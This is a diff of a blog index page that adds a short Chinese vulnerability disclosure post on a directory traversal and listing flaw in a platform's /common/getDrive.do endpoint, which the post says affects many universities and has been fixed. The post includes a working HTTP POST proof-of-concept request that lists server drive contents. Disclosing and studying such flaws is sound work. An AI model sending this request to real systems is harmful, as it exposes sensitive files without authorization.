@@ -52,6 +52,60 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-CNVD-2023-3**63" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="../../blogs/CNVD-2023-3**63/" class="article-date">
+  <time class="dt-published" datetime="2023-04-23T06:51:19.000Z" itemprop="datePublished">2023-04-23</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="../../categories/CNVD/">CNVD</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="../../blogs/CNVD-2023-3**63/">CNVD-2023-3**63</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>某平台系统存在任意目录遍历漏洞，攻击者可利用该漏洞读取系统敏感信息，影响范围涉及全国大部分高校，现已修复。</p>
+<p><img src="/img/blog_img/cnvd/cnvd_05.png" alt=""></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞位于文件 <code>WEB-INF/classes/com/fh/controller/common/Uploader.class</code></p>
+<p>路由是 <code>/common/getDrive.do</code></p>
+<p><img src="/img/blog_img/cnvd/cnvd_06.png" style="zoom:50%;" /></p>
+<p>前面两个 if判断都是在 <code>type</code> 为 <code>library</code> 的时候进入，我们这里传入的是 <code>type=drives</code> ，直接进入到第三个 if语句；</p>
+<p>调用 <code>File.listFiles</code> ，直接列出对应文件下的文件，然后放入到 <code>map</code> 中返回。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>POC</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/common/getDrive.do</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36</span><br><span class="line"></span><br><span class="line">path=C%3A%5C（可继续加路由）&amp;type=drives&amp;extensions=</span><br></pre></td></tr></table></figure>
+<p><img src="/img/blog_img/cnvd/cnvd_07.png" style="zoom:50%;" /></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite-url/blogs/CNVD-2023-3**63/" data-id="cm1sy6twg0001ypob8oxseisf" data-title="CNVD-2023-3**63" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/cnvd/" rel="tag">cnvd</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-TP5-0-12-RCE" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="../../blogs/TP5-0-12-RCE/" class="article-date">
@@ -158,6 +212,10 @@
       <ul>
         
           <li>
+            <a href="../../blogs/PromptEngineeringGuidance/">PromptEngineeringGuidance</a>
+          </li>
+        
+          <li>
             <a href="../../blogs/PromptAirlineWP/">PromptAirlineWP</a>
           </li>
         
@@ -171,10 +229,6 @@
         
           <li>
             <a href="../../blogs/Interview-Q-A/">Interview Q&amp;A</a>
-          </li>
-        
-          <li>
-            <a href="../../blogs/Hexo%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/">Hexo常用操作</a>
           </li>
         
       </ul>
